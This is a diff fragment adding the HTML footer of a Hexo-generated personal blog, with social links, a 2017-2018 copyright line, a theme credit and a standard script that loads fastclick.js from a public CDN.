+              <li>
+                  <a target="_blank"  href="https://github.com/asensioatgithub">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
+              <li>
+                  <a href="mailto:emilsinclair@163.com" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+      </ul>
+     <div class="text-muted copyright">
+            &copy;
+            
+            2017 - 2018
+            
+            
+              <i class="fa fa-heart"></i>
+            
+            Asensio
+        <br>
+          
+              Powered by <a target="_blank" href="https://hexo.io">Hexo</a>
+          
+          
+            |
+          
+          
+              Theme - <a href="https://github.com/huyingjie/hexo-theme-A-RSnippet" target="_blank">A-RSnippet</a> v0.1.0
+          
+          
+      </div>
+    </div>
+</footer>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+</body>
+
+</html>
